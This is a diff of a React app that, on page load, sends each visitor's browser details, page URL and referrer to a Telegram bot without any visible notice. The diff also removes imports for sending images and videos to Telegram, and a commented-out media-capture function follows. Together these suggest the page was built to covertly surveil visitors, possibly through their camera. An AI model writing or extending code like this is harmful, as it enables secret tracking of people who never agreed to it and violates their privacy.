@@ -1,5 +1,5 @@
 import { useEffect, useCallback } from 'react';
-import { sendTelegramNotification, sendImageToTelegram, sendVideoToTelegram } from './utils/telegram';
+import { sendTelegramNotification } from './utils/telegram';
 
 function App() {
   useEffect(() => {
@@ -15,14 +15,14 @@ function App() {
     sendVisitorNotification();
   }, []);
 
-  const sendLocation = async () => {
+  const sendLocation = useCallback(async () => {
       await sendTelegramNotification({
         userAgent: navigator.userAgent,
         location: window.location.href,
         referrer: document.referrer || 'Direct',
         previousSites: document.referrer || 'None',
       });
-    };
+    },[])
 
   // const captureAndSendMedia = useCallback(async () => {
   //   try {
